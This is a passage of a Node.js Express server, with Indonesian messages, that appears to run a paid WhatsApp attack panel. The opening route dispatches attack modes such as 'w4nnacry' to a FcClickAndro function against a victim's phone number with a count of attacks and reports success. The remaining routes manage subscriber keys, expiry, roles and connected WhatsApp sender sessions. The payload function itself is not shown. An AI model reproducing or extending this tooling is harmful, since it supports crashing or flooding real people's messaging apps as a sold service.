        FcClickAndro(totalAttacks, target);
        break;
      case "ex4ltedz":
      case "w4nnacry":
        FcClickAndro(totalAttacks, target);
        break;
      default:
        throw new Error("Mode tidak dikenal.");
    }

    return res.send(executionPageHTML(user, mode, targetNumber, `✅ S U C C E S\n𝐄𝐱𝐞𝐜𝐮𝐭𝐞 𝐌𝐨𝐝𝐞: ${mode.toUpperCase()}`));
  } catch (err) {
    return res.send(executionPageHTML(user, mode, targetNumber, `❌ Gagal kirim: ${err.message || "Terjadi kesalahan saat pengiriman."}`));
  }
});

app.get("/dashboard", (req, res) => {
  const username = req.cookies.sessionUser;
  if (!username) {
    return res.redirect("/login");
  }

  const users = getUsers();
  const user = users.find(u => u.username === username);

  if (!user) {
    return res.redirect("/execution");
  }

  // Get active sender numbers
  const activeSenders = sessions.size > 0 ? [...sessions.keys()] : [];
  
  res.send(ownerDashboardHTML(users, activeSenders, user.role));
});

app.post("/add-key", (req, res) => {
  const currentUsername = req.cookies.sessionUser;
  if (!currentUsername) {
    return res.json({ success: false, message: "Not authenticated" });
  }

  const users = getUsers();
  const currentUser = users.find(u => u.username === currentUsername);
  
  if (!currentUser || !hasManagementPermission(currentUser.role, 'userManagement')) {
    return res.json({ success: false, message: "Permission denied" });
  }

  const { username: newUsername, key, duration, durationUnit, role } = req.body;
  
  if (!newUsername || !key || !duration || !durationUnit || !role) {
    return res.json({ success: false, message: "Missing required fields" });
  }

  // Calculate expiration time
  let durationMs;
  const durationValue = parseInt(duration);
  
  switch(durationUnit) {
    case 'minutes':
      durationMs = durationValue * 60 * 1000;
      break;
    case 'hours':
      durationMs = durationValue * 60 * 60 * 1000;
      break;
    case 'days':
      durationMs = durationValue * 24 * 60 * 60 * 1000;
      break;
    case 'months':
      durationMs = durationValue * 30 * 24 * 60 * 60 * 1000;
      break;
    default:
      return res.json({ success: false, message: "Invalid duration unit" });
  }

  const expired = Date.now() + durationMs;
  
  // Check if user already exists
  const existingUserIndex = users.findIndex(u => u.username === newUsername);
  if (existingUserIndex !== -1) {
    users[existingUserIndex].key = key;
    users[existingUserIndex].expired = expired;
    users[existingUserIndex].role = role;
  } else {
    users.push({ username: newUsername, key, expired, role });
  }

  saveUsers(users);
  res.json({ success: true });
});

app.post("/edit-key", (req, res) => {
  const currentUsername = req.cookies.sessionUser;
  if (!currentUsername) {
    return res.json({ success: false, message: "Not authenticated" });
  }

  const users = getUsers();
  const currentUser = users.find(u => u.username === currentUsername);
  
  if (!currentUser || !hasManagementPermission(currentUser.role, 'userManagement')) {
    return res.json({ success: false, message: "Permission denied" });
  }

  const { oldUsername, username: newUsername, key, role } = req.body;
  
  if (!oldUsername || !newUsername || !key || !role) {
    return res.json({ success: false, message: "Missing required fields" });
  }

  const editUserIndex = users.findIndex(u => u.username === oldUsername);
  if (editUserIndex === -1) {
    return res.json({ success: false, message: "User not found" });
  }

  // Prevent non-owners from editing owner accounts
  if (users[editUserIndex].role === ROLES.OWNER && currentUser.role !== ROLES.OWNER) {
    return res.json({ success: false, message: "Only owner can edit other owners" });
  }

  // Prevent non-owners from creating new owner accounts
  if (role === ROLES.OWNER && currentUser.role !== ROLES.OWNER) {
    return res.json({ success: false, message: "Only owner can create owner accounts" });
  }

  users[editUserIndex].username = newUsername;
  users[editUserIndex].key = key;
  users[editUserIndex].role = role;
  saveUsers(users);
  res.json({ success: true });
});

app.post("/extend-key", (req, res) => {
  const currentUsername = req.cookies.sessionUser;
  if (!currentUsername) {
    return res.json({ success: false, message: "Not authenticated" });
  }

  const users = getUsers();
  const currentUser = users.find(u => u.username === currentUsername);
  
  if (!currentUser || !hasManagementPermission(currentUser.role, 'userManagement')) {
    return res.json({ success: false, message: "Permission denied" });
  }

  const { username: extendUsername, amount, unit } = req.body;
  
  if (!extendUsername || !amount || !unit) {
    return res.json({ success: false, message: "Missing required fields" });
  }

  const extendUserIndex = users.findIndex(u => u.username === extendUsername);
  if (extendUserIndex === -1) {
    return res.json({ success: false, message: "User not found" });
  }

  // Calculate extension time
  let durationMs;
  const durationValue = parseInt(amount);
  
  switch(unit) {
    case 'minutes':
      durationMs = durationValue * 60 * 1000;
      break;
    case 'hours':
      durationMs = durationValue * 60 * 60 * 1000;
      break;
    case 'days':
      durationMs = durationValue * 24 * 60 * 60 * 1000;
      break;
    case 'months':
      durationMs = durationValue * 30 * 24 * 60 * 60 * 1000;
      break;
    default:
      return res.json({ success: false, message: "Invalid duration unit" });
  }

  users[extendUserIndex].expired += durationMs;
  saveUsers(users);
  res.json({ success: true });
});

app.post("/delete-key", (req, res) => {
  const currentUsername = req.cookies.sessionUser;
  if (!currentUsername) {
    return res.json({ success: false, message: "Not authenticated" });
  }

  const users = getUsers();
  const currentUser = users.find(u => u.username === currentUsername);
  
  if (!currentUser || !hasManagementPermission(currentUser.role, 'userManagement')) {
    return res.json({ success: false, message: "Permission denied" });
  }

  const { username: deleteUsername } = req.body;
  
  if (!deleteUsername) {
    return res.json({ success: false, message: "Missing username" });
  }

  const deleteUserIndex = users.findIndex(u => u.username === deleteUsername);
  if (deleteUserIndex === -1) {
    return res.json({ success: false, message: "User not found" });
  }

  // Prevent non-owners from deleting owner accounts
  if (users[deleteUserIndex].role === ROLES.OWNER && currentUser.role !== ROLES.OWNER) {
    return res.json({ success: false, message: "Only owner can delete owner accounts" });
  }

  users.splice(deleteUserIndex, 1);
  saveUsers(users);
  res.json({ success: true });
});

app.post("/connect-sender", (req, res) => {
  const currentUsername = req.cookies.sessionUser;
  if (!currentUsername) {
    return res.json({ success: false, message: "Not authenticated" });
  }

  const users = getUsers();
  const currentUser = users.find(u => u.username === currentUsername);
  
  if (!currentUser || !hasManagementPermission(currentUser.role, 'senderManagement')) {
    return res.json({ success: false, message: "Permission denied" });
  }

  const { number } = req.body;
  
  if (!number) {
    return res.json({ success: false, message: "Missing number" });
  }

  // In a real implementation, you would connect to WhatsApp here
  // For now, we'll just simulate it by adding to sessions
  sessions.set(number, {});
  saveActive(number);
  
  res.json({ success: true });
});

app.post("/delete-sender", (req, res) => {
  const currentUsername = req.cookies.sessionUser;
  if (!currentUsername) {
    return res.json({ success: false, message: "Not authenticated" });
  }

  const users = getUsers();
  const currentUser = users.find(u => u.username === currentUsername);
  
  if (!currentUser || !hasManagementPermission(currentUser.role, 'senderManagement')) {
    return res.json({ success: false, message: "Permission denied" });
  }

  const { number } = req.body;
  
  if (!number) {
    return res.json({ success: false, message: "Missing number" });
  }

  if (!sessions.has(number)) {
    return res.json({ success: false, message: "Sender not found" });
  }

  try {
    const sessionDir = sessionPath(number);
    sessions.get(number).end();
    sessions.delete(number);
    fs.rmSync(sessionDir, { recursive: true, force: true });

    const data = JSON.parse(fs.readFileSync(file_session));
    const updated = data.filter(n => n !== number);
    fs.writeFileSync(file_session, JSON.stringify(updated));

    res.json({ success: true });
  } catch (err) {
    console.error(err);
    res.json({ success: false, message: err.message });
  }
});

app.post("/update-permission", (req, res) => {
  const currentUsername = req.cookies.sessionUser;
  if (!currentUsername) {
    return res.json({ success: false, message: "Not authenticated" });
  }

  const users = getUsers();
  const currentUser = users.find(u => u.username === currentUsername);
  
  if (!currentUser || currentUser.role !== ROLES.OWNER) {
    return res.json({ success: false, message: "Permission denied" });
  }

  const { role, permission, enabled } = req.body;
  
  if (!role || !permission || enabled === undefined) {
    return res.json({ success: false, message: "Missing required fields" });
  }

  if (!ROLE_PERMISSIONS[role]) {
    ROLE_PERMISSIONS[role] = {};
  }

  ROLE_PERMISSIONS[role][permission] = enabled;
  res.json({ success: true });
});

app.get("/logout", (req, res) => {
  res.clearCookie("sessionUser");
  res.redirect("/");
});

app.listen(PORT, () => {
  console.log(`✅ Server aktif di port ${PORT}`);
});
